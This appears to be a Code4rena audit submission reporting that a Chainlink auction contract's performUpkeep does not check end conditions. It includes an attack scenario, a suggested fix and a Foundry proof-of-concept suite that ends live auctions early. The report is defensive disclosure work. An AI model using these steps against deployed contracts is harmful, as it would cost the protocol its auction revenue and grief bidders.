# C4 Submission Form

## Severity rating

Medium

## Title

performUpkeep does not validate auction end conditions, allowing AUCTION_WORKER to terminate auctions immediately after start with zero revenue

## Links to root cause

```
https://github.com/code-423n4/2026-03-chainlink/blob/main/src/BaseAuction.sol#L359
https://github.com/code-423n4/2026-03-chainlink/blob/main/src/BaseAuction.sol#L369
```

## Vulnerability details

---COPY FROM HERE---

## Finding description and impact

In `performUpkeep()`, the `endedAuctions` processing loop ([L359-369](https://github.com/code-423n4/2026-03-chainlink/blob/main/src/BaseAuction.sol#L359)) only validates that the auction exists (`s_auctionStarts[asset] != 0`). It does **not** verify any actual end conditions:

```solidity
for (uint256 i; i < endedAuctions.length; ++i) {
    address asset = endedAuctions[i];
    if (s_auctionStarts[asset] == 0) {
        revert InvalidAuction(asset);
    }
    // ← NO check: auctionDuration elapsed?
    // ← NO check: remaining balance < minAuctionSizeUsd?
    _onAuctionEnd(endedAuctions[i], hasFeeAggregator);
    delete s_auctionStarts[asset];
}
```

By contrast, `checkUpkeep()` ([L259-275](https://github.com/code-423n4/2026-03-chainlink/blob/main/src/BaseAuction.sol#L259)) correctly checks both conditions before adding assets to the `endedAuctions` array:
- L259: `block.timestamp - s_auctionStarts[asset] > assetParams.auctionDuration` (duration elapsed)
- L267: `auctionBalance < minAuctionSizeUsd` (dust balance remaining)

However, `performUpkeep` trusts the `performData` input blindly. Since `performData` is ABI-encoded off-chain (by the Automation keeper or any caller with `AUCTION_WORKER_ROLE`), a caller can include **any** active auction in the `endedAuctions` array, regardless of whether end conditions are met.

### Impact

- **Premature auction termination**: AUCTION_WORKER can end an auction 1 second after it starts. All unsold tokens are returned to feeAggregator via `_onAuctionEnd` at **zero revenue**.
- **Mass termination**: Multiple live auctions can be terminated simultaneously in a single `performUpkeep` call. For a protocol with $500k+ in active auctions across several assets, this means total revenue loss.
- **Partial bidder grief**: A bidder who already purchased a portion of the auction (paid LINK) sees the remaining auction terminated prematurely. The unsold tokens return to feeAggregator instead of being available for further bidding.
- **CowSwap order invalidation**: In-flight CowSwap orders that have been validated via `isValidSignature` become unfillable when the auction is prematurely ended, as the contract's token balance drops to zero.

While `AUCTION_WORKER_ROLE` is trusted automation infrastructure, the complete absence of on-chain enforcement means:
- A **compromised automation key** can terminate all active auctions instantly
- An **automation bug** (incorrect `performData` construction) can accidentally end live auctions
- There is **no defense-in-depth** — the single trust assumption has no fallback validation

### Attack Scenario

1. Protocol has $200k in active auctions (USDC + WETH), both started 10 minutes ago with 24-hour duration.
2. AUCTION_WORKER's private key is compromised (or automation service has a bug).
3. Attacker crafts `performData = abi.encode([], [USDC, WETH])` — no eligible assets, both as ended.
4. Calls `performUpkeep(performData)`. Both auctions end immediately.
5. $200k of unsold tokens returned to feeAggregator. Zero LINK revenue generated.
6. Protocol must restart auctions from scratch, wasting gas and creating gaps in fee conversion.

## Recommended mitigation steps

Add on-chain validation in the `endedAuctions` loop to verify that at least one end condition is actually met:

```solidity
for (uint256 i; i < endedAuctions.length; ++i) {
    address asset = endedAuctions[i];
    if (s_auctionStarts[asset] == 0) {
        revert InvalidAuction(asset);
    }

    BaseAuction.AssetParams memory assetParams = s_assetParams[asset];
    bool durationElapsed = block.timestamp - s_auctionStarts[asset] > assetParams.auctionDuration;
    bool balanceDepleted = IERC20(asset).balanceOf(address(this)) < minAuctionSizeUsd;

    if (!durationElapsed && !balanceDepleted) {
        revert AuctionStillActive(asset);
    }

    _onAuctionEnd(endedAuctions[i], hasFeeAggregator);
    delete s_auctionStarts[asset];
}
```

---END COPY FOR VULNERABILITY DETAILS---

## Proof of Concept (PoC)

---COPY FROM HERE---

Run with:

```bash
forge test --match-contract M04_PerformUpkeepNoEndValidation -vvv
```

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.26;

import {C4PoC} from "./C4PoC.t.sol";
import {BaseAuction} from "src/BaseAuction.sol";
import {Common} from "src/libraries/Common.sol";
import {Errors} from "src/libraries/Errors.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

/// @title M-04: performUpkeep Does Not Validate Auction End Conditions
/// @notice performUpkeep accepts any asset in the endedAuctions array as long as
///         s_auctionStarts[asset] != 0. It does NOT verify:
///           1) auctionDuration has elapsed
///           2) Remaining balance is below minAuctionSizeUsd
///         This allows AUCTION_WORKER_ROLE to terminate auctions immediately after
///         they start, at the highest price multiplier, causing revenue loss.
///
/// Root cause: BaseAuction.sol L359-369
///
/// Impact: Medium — A compromised or buggy AUCTION_WORKER can end auctions prematurely:
///   - Unsold tokens returned to feeAggregator (no direct fund loss)
///   - Revenue opportunity lost — tokens that would have been sold at auction are returned
///   - CowSwap orders in-flight become unfillable mid-batch
///   - Protocol must restart auctions, wasting gas and creating gaps in fee conversion
contract M04_PerformUpkeepNoEndValidation is C4PoC {

    /// @notice Proves that AUCTION_WORKER can end an auction 1 second after it starts.
    function test_M04_prematureAuctionEnd() public {
        // 1. Start a $100k USDC auction
        _startAuction(address(mockUSDC), 100_000e6);

        uint256 auctionStart = auction.getAuctionStart(address(mockUSDC));
        assertGt(auctionStart, 0, "Auction should be live");

        // Verify the auction has 1 day duration remaining
        BaseAuction.AssetParams memory params = auction.getAssetParams(address(mockUSDC));
        assertEq(params.auctionDuration, 1 days, "Auction duration should be 1 day");

        // 2. Only 1 second has passed — auction should have ~24 hours left
        skip(1);

        // 3. AUCTION_WORKER crafts performData to end the auction immediately
        _changePrank(auctionAdmin);
        Common.AssetAmount[] memory noEligible = new Common.AssetAmount[](0);
        address[] memory endAuctions = new address[](1);
        endAuctions[0] = address(mockUSDC);
        bytes memory performData = abi.encode(noEligible, endAuctions);

        // Record state before premature end
        uint256 feeAggregatorBefore = IERC20(address(mockUSDC)).balanceOf(address(feeAggregator));
        uint256 auctionBalanceBefore = IERC20(address(mockUSDC)).balanceOf(address(auction));
        assertGt(auctionBalanceBefore, 0, "Auction should hold USDC");

        // 4. performUpkeep succeeds — no validation that auction has actually ended!
        auction.performUpkeep(performData);

        // 5. Auction is now terminated
        assertEq(auction.getAuctionStart(address(mockUSDC)), 0, "Auction should be cleared");

        // 6. All USDC returned to feeAggregator — zero revenue generated
        uint256 feeAggregatorAfter = IERC20(address(mockUSDC)).balanceOf(address(feeAggregator));
        assertGt(feeAggregatorAfter, feeAggregatorBefore, "USDC should be returned to feeAggregator");
        assertEq(
            feeAggregatorAfter - feeAggregatorBefore,
            auctionBalanceBefore,
            "ALL USDC returned - zero auction revenue"
        );

        // 7. No LINK was received by reserves (zero revenue)
        assertEq(
            IERC20(address(mockLINK)).balanceOf(reserves),
            0,
            "Reserves received zero LINK - all revenue lost"
        );
    }

    /// @notice Proves that AUCTION_WORKER can simultaneously end ALL live auctions.
    function test_M04_massAuctionTermination() public {
        // 1. Start auctions for both USDC and WETH
        deal(address(mockUSDC), address(feeAggregator), 100_000e6);
        deal(address(mockWETH), address(feeAggregator), 25e18);

        _changePrank(auctionAdmin);
        (, bytes memory performData) = auction.checkUpkeep("");
        auction.performUpkeep(performData);

        assertGt(auction.getAuctionStart(address(mockUSDC)), 0, "USDC auction should be live");
        assertGt(auction.getAuctionStart(address(mockWETH)), 0, "WETH auction should be live");

        // 2. 10 minutes later — both auctions are still very early in their 24h duration
        skip(10 minutes);
        _refreshPrices();

        // 3. AUCTION_WORKER terminates both auctions in one call
        Common.AssetAmount[] memory noEligible = new Common.AssetAmount[](0);
        address[] memory endBoth = new address[](2);
        endBoth[0] = address(mockUSDC);
        endBoth[1] = address(mockWETH);
        bytes memory endAllData = abi.encode(noEligible, endBoth);

        _changePrank(auctionAdmin);
        auction.performUpkeep(endAllData);

        // 4. Both auctions ended prematurely
        assertEq(auction.getAuctionStart(address(mockUSDC)), 0, "USDC auction ended");
        assertEq(auction.getAuctionStart(address(mockWETH)), 0, "WETH auction ended");

        // 5. All assets returned to feeAggregator — ~$200k of auction opportunity lost
        assertGt(
            IERC20(address(mockUSDC)).balanceOf(address(feeAggregator)),
            0,
            "USDC returned to feeAggregator"
        );
        assertGt(
            IERC20(address(mockWETH)).balanceOf(address(feeAggregator)),
            0,
            "WETH returned to feeAggregator"
        );
        assertEq(
            IERC20(address(mockLINK)).balanceOf(reserves),
            0,
            "Zero LINK revenue from premature termination"
        );
    }

    /// @notice Shows that a bidder who partially filled can be griefed by premature end:
    ///         they paid LINK but the rest of the auction is cancelled.
    function test_M04_partialBidThenPrematureEnd() public {
        // 1. Start a USDC auction
        _startAuction(address(mockUSDC), 100_000e6);

        // 2. Skip to mid-auction
        skip(12 hours);
        _refreshPrices();

        // 3. Bidder bids on 10% of the auction
        _fundBidder(10_000e18);
        _bid(address(mockUSDC), 10_000e6);

        uint256 reservesLinkBefore = IERC20(address(mockLINK)).balanceOf(reserves);
        uint256 remainingUsdc = IERC20(address(mockUSDC)).balanceOf(address(auction));
        assertGt(remainingUsdc, 80_000e6, "Should have ~90k USDC remaining in auction");

        // 4. AUCTION_WORKER prematurely ends the auction — remaining 90k USDC goes back
        _changePrank(auctionAdmin);
        Common.AssetAmount[] memory noEligible = new Common.AssetAmount[](0);
        address[] memory endAuctions = new address[](1);
        endAuctions[0] = address(mockUSDC);
        auction.performUpkeep(abi.encode(noEligible, endAuctions));

        // 5. Remaining USDC returned with zero revenue for the remaining portion
        assertGt(
            IERC20(address(mockUSDC)).balanceOf(address(feeAggregator)),
            80_000e6,
            "~90k USDC returned to feeAggregator instead of being sold"
        );

        // Revenue was only from the partial bid, not the full auction potential
        uint256 reservesLinkAfter = IERC20(address(mockLINK)).balanceOf(reserves);
        assertGt(reservesLinkAfter, reservesLinkBefore, "Some LINK received from partial bid");
        // But ~90% of the auction revenue was forfeited
    }
}
```

**Test results:**
```
Ran 4 tests for test/poc/M04_PerformUpkeepNoEndValidation.t.sol:M04_PerformUpkeepNoEndValidation
[PASS] testSubmissionValidity() (gas: 166)
[PASS] test_M04_prematureAuctionEnd() (gas: 532157)
[PASS] test_M04_massAuctionTermination() (gas: 693241)
[PASS] test_M04_partialBidThenPrematureEnd() (gas: 661823)
Suite result: ok. 4 passed; 0 failed; 0 skipped
```

---END COPY FOR POC---
